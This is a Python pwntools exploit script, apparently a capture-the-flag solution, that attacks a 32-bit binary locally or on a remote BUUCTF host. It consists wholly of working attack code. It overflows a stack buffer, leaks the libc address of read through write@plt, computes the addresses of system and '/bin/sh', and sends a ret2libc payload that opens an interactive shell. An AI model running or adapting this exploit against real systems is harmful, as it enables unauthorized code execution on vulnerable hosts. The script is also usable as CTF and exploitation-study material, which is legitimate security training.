from pwn import *
file_path='./level1'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
glibc_version="2.23"
_debug_=1

elf = ELF(file_path)
#pwn.io init
if _debug_:
    pwn_file="/glibc/%s/32/lib/ld-%s.so --library-path /glibc/%s/32/lib/ %s"%(glibc_version,glibc_version,glibc_version,file_path)
    p = process(pwn_file.split())
    libc = ELF('/glibc/%s/32/lib/libc-%s.so'%(glibc_version,glibc_version))
else:
    p = remote('node3.buuoj.cn',28124)
    libc = ELF('../libc/u16/x86libc-2.23.so')

#common pack
su  = lambda desp,value:success(desp+' => '+(hex(value) if type(value)==int else str(value)))
ru  = lambda delim            :p.recvuntil(delim)
rv  = lambda count=1024,timeout=0:p.recv(count,timeout)
sl  = lambda data             :p.sendline(data)
sla = lambda delim,data       :p.sendlineafter(delim, data)
ss  = lambda data             :p.send(data)
ssa = lambda delim,data       :p.sendafter(delim, data)
u64leak=lambda :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\0'))
u64leak2=lambda :u64(p.recv(6).ljust(8,b'\0'))

write_plt = elf.plt['write']
read_got = elf.got['read']
main_addr = 0x080484B7

payload = b'A'*0x88+b'B'*0x4+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)#rop泄露libc
#gdb.attach(p,'b *0x080484B5')
p.sendafter("?",payload)
p.recvuntil('\n')
read_addr = u32(p.recv(4))
log.success("read_addr:{}".format(hex(read_addr)))
libc_base = read_addr - libc.symbols['read']
system = libc_base+libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.success("libc_base:{}".format(hex(libc_base)))
log.success("system:{}".format(hex(system)))
log.success("binsh:{}".format(hex(binsh)))

payload2 =  b'A'*0x88+b'B'*0x4+p32(system)+p32(main_addr)+p32(binsh)

p.send(payload2)
p.interactive()